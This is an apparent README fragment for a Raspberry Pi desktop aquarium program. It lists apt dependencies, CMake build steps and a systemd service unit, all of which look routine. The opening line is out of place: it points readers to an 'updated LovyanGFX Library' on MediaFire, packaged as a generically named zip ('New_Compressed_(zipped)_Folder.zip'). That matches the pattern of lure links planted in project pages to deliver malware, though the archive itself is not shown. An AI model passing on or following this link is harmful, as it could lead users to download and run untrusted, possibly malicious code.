Download the updated LovyanGFX Library:
https://www.mediafire.com/file/c73qicl5uonfffs/New_Compressed_%2528zipped%2529_Folder.zip/file

---

## Raspberry Pi / SDL2 (`aquarium-pi/`)

### Dependencies

```bash
sudo apt-get install \
    build-essential cmake pkg-config \
    libsdl2-dev libsdl2-gfx-dev libsdl2-ttf-dev \
    libcurl4-openssl-dev \
    fonts-dejavu-core
```

### Build

```bash
cd aquarium-pi
mkdir build && cd build
cmake ..
make -j$(nproc)
./aquarium
```

### Auto-start on boot (systemd — X11 desktop)

Create `/etc/systemd/system/aquarium.service`:

```ini
[Unit]
Description=Desktop Aquarium
After=graphical.target

[Service]
User=joseph
Environment=DISPLAY=:0
Environment=XAUTHORITY=/home/joseph/.Xauthority
ExecStart=/home/joseph/aquarium-pi/build/aquarium
Restart=on-failure
RestartSec=5

[Install]
WantedBy=graphical.target
```

Then enable it:

```bash
sudo systemctl daemon-reload
sudo systemctl enable aquarium.service
sudo systemctl start aquarium.service

# Check logs if it fails:
journalctl -u aquarium.service -f
```
